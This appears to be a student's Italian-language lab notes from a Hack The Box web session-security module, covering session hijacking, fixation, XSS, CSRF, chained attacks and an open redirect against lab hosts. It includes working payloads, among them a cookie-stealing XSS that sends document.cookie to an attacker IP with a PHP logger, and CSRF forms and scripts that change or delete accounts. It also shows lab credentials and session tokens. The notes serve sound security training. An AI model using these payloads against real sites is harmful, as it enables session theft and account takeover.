# Preparazione generale

sunmaster@htb[/htb]$ IP=10.129.15.167
sunmaster@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts

# Session hijacking example

Navigate to http://xss.htb.net and log in to the application using the credentials below:

    Email: heavycat106
    Password: rocknrol

dev tools > storage > cookies > auth-session

s%3Ap7fuIy02REjDK3BHBea7dmN4RCVeEepS.Wa0NLkHQQdUHsnmNTion3bC8%2BQQ%2BaU44XGR7QzVagPU

te lo copi, poi in finestra privata navigi su http://xss.htb.net e metti questo cookie al posto di quello che trovi e magicamente sei loggato! Complimenti hai rubato il tuo primo token di sessione!!!

# Session Fixation Example

Navighiamo su oredirect.htb.net

L'url ha questa forma

```html
http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM
  TOKEN
  VALUE
></RANDOM>
```

dev tools > storage > cookies > PHPSESSID

e' uguale al token nell'url

se modifichiamo il parametro token vediamo che cambia anche il volore del cookie

siamo in presenza di session fixation perche possiamo controllare il token di sessione tramite l'url.

# Ottenere token di sessione senza interazione dell'utente

## Traffic Sniffing

Cattura del traffico con wireshark. filtro su packet bytes > string > auth-session

## post-exploitation PHP

andiamo a cercare e leggere dove php salva la sessione su disco

```shell
$ locate php.ini
$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'

$ ls /var/lib/php/sessions # configurazione di default
$ cat /var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```

il contenuto del token viene stampato in chiaro

## post-exploitation JAVA

Vediamo ora dove vengono memorizzati gli identificatori di sessione Java.

Secondo la Apache Software Foundation:

"L'elemento Manager rappresenta il gestore di sessioni utilizzato per creare e mantenere le sessioni HTTP di un'applicazione web.

Tomcat fornisce due implementazioni standard di Manager. L'implementazione predefinita memorizza le sessioni attive, mentre quella opzionale memorizza le sessioni attive che sono state scambiate (oltre a salvare le sessioni durante il riavvio del server) in una posizione di memorizzazione selezionata tramite l'uso di un elemento nidificato Store appropriato. Il nome del file dei dati di sessione predefinito è SESSIONS.ser".

Ulteriori informazioni sono disponibili qui: http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html

## post-exploitation .NET

Infine, vediamo dove vengono memorizzati gli identificatori di sessione .NET.

I dati di sessione si trovano in:

- Il processo worker dell'applicazione `aspnet_wp.exe` - questo è il caso della modalità InProc Session
- StateServer (un servizio Windows residente su IIS o su un server separato) - Questo è il caso della modalità OutProc Session
- Un server SQL

## post-exploitation ACCESSO ALLA BASE DI DATI

Se riusciamo ad ottenere l'accesso alla base di dati possiamo anche rubare dati di sessione, per esempio

```sql
show databases;
use project;
show tables;
select * from users;
```

se scopriamo che esiste una tabella di sessione possiamo concentrarci su quella

````sql
select * from all_sessions;
select * from all_sessions where id=3;
```
````



# XSS

navigare su xss.htb.net

login con 

- Email: crazygorilla983 
- Password: pisces

in uno qualunque dei tre campi inseriamo il payload `"><img src=x onerror=prompt(document.domain)>`

click su share e vediamo che il sito e' vulnerabile alle StoredXSS

Crea una pagina php che logga i cookie (log.php) 

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>

```

questo script attende qualunque richiest con `?c=+document.cookie` e poi parsa e salva il cookie

avviamo il server php

```shell
$ php -S <VPN/TUN Adapter IP>:8000
```

e mettiamo come payload nel form di prima questo js 

```js
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

nella shell (e nel file cookieLog.txt) possiao leggere il cookie

tutto questo si puo fare anche diversamente, solo con netcat `nc -nlvp 8000` senza la pagina php. in questo caso il risultato si legge solo nella shell, senza salvataggio su file.

# Cross-Site Request Forgery Example (lab_csfr1)
Navigate to http://xss.htb.net and log in to the application using the credentials below:

    Email: crazygorilla983
    Password: pisces

apriao burp suite e catturiamo la post di update del profilo. notiamo subito che non c'e' un token anti-csrf.

creiamo la pagina `notmalicious.html`

```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

e serviamola con python 

```shell
$ python -m http.server 1337
```

visitiamo la pagina `http://10.10.15.253:1337/notmalicious.html`

e vediamo che i dati del profilo della vittima sono cambiati!
Abbiamo fatto una CSFR, elementare ma che funziona!

# Cross-Site Request Forgery Example GET-based (lab_csfr2)

Navigate to http://csrf.htb.net and log in to the application using the credentials below:

- Email: heavycat106
- Password: rocknrol

modifichiamo e catturiamo con burp il save di conferma (secondo)

vediamo che e' una GET con tutti i parametri nell'url e che c'e' il csfr token

copiamo il token 

andiamo a creare una pagina html `notmalicious_get.html` con il token corretto copiato prima

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="<TOKEN_SNIFFED>" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>

```

avviamo il server

```shell
python -m http.server 1337
```

andiamo su `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`
e anche qui la modifica dei dati ha avuto successo!

# Cross-Site Request Forgery Example POST-based (lab_csfr3)

Navigate to http://csrf.htb.net and log in to the application using the credentials below:

    Email: heavycat106
    Password: rocknrol

nella delete dell'account il path e' questo `http://csrf.htb.net/app/delete/attacker@htb.net` ovvero `/app/delete/<your-email>`

possiamo provare ad inserire codice nel campo mail per vedere cosa succede

`<h1>h1<u>underline<%2fu><%2fh1>`

e click su delete (senza salvare) vediamo che effettivametne abbiamo uno stozzo di html interpretato.

avviamo netcat
```shell
$ nc -nlvp 8000
```

inseriamo un payload diverso nel campo mail

```js
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

click su delete 

nella shell con nc abbiamo il CSFR token e possiamo usarlo per fare la nostra richiesta

# XSS & CSRF Chaining

Navigate to http://minilab.htb.net and log in to the application using the credentials below:

- Email: crazygorilla983
- Password: pisces

cattura con burp la POST su change visibility (la conferma)

c'e' il csfr token 

pyload del campo Country, save e  rendiamo pubblico il profilo

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>

```

Open a New Private Window, navigate to http://minilab.htb.net again and log in to the application using the credentials below:

    Email: goldenpeacock467
    Password: topcat

Andiamo su http://minilab.htb.net/profile?email=ela.stienen@example.com
Vediamo il profilo di ela
Ora se torniamo sulla pagina profilo dell'altro tizio vediamo che e' diventata pubblica (aggiorna la pagina). Vuol dire che lo script inserito nella pagina come payload del profilo della tizia e stato eseguito e ha funzionato, agirando le policy di same-origin perche' effettivamente l'origine e' la stessa!!!


Adapt the XSS payload above to delete @goldenpeacock467's account through CSRF

```js
<script>
let email=document.querySelector('#userProfileEmail');
console.log("Email", email.innerText);
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get',`/app/delete/${email.innerText}`,true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.send('csrf='+token);
};
</script>

```

soluzione CABLATA!

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>

```

# Token debole (lab_csfr_weak)

Navigate to http://csrf.htb.net and log in to the application using the credentials below:

    Email: goldenpeacock467
    Password: topcat

troviamo il token e verifichiamo che corrisponde all'md5 dello username

```shell
$ echo -n goldenpeacock467 | md5sum
0bef12f8998057a7656043b6d30c90a2  -
```

creiamo una pagina malevolevola `press_start_2_win.html`

e avviamo il server python 

```shell
$ python -m http.server 1337
```

Open a New Private Window, navigate to http://csrf.htb.net and log in to the application using the credentials below:

    Email: crazygorilla983
    Password: pisces

e navighiamo su `http://<VPN/TUN Adapter IP>:1337/press_start_2_win.html.`

start > make > profilo publico

# Open redirect

http://oredirect.htb.net/?redirect_uri=/complete.html&token=bna0dkpkgeuti4if7366vb01go

nc -lvnp 1337

http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>







<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.253:8000/log.php?c=' + document.cookie;"></video>


s%3A-cGUiT3JyOadW9qkkFj1X3EF8BmsEjBf.L1jshCR8FfIsvgXEn51FFE3V%2BHHB%2BAYvRZYaiCa3FYE

http://minilab.htb.net/app/

Super Admin
@superadmin
superadmin@htb.net

Expert Info (Chat/Sequence): GET /?redirect_uri=/complete.html&token=FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED} HTTP/1.1\r\n